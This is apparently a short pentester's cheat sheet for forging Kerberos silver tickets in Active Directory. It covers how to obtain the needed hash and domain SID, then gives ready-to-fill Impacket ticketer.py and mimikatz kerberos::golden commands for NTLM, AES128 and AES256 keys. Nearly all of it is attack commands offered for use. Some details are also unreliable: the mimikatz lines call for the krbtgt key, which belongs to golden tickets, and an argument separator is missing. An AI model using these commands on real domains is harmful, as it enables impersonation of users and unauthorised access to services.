# Silver Tickets
- **PAC Disable**
1. SPN hash -- `iwr  -UseDefaultCredentials http://web04` --> Force！
2. Domain SID -- `Whoami /user`
3. Target SPN -- CN --> `Serviceclass/host:port/servicename`
## Impacket
```bash
 python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
- python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
```
## mimikatz

AES 256 Key:
```powershell
 mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
```

AES 128 Key:

```powershell
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
```

NTLM:
```powershell
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
```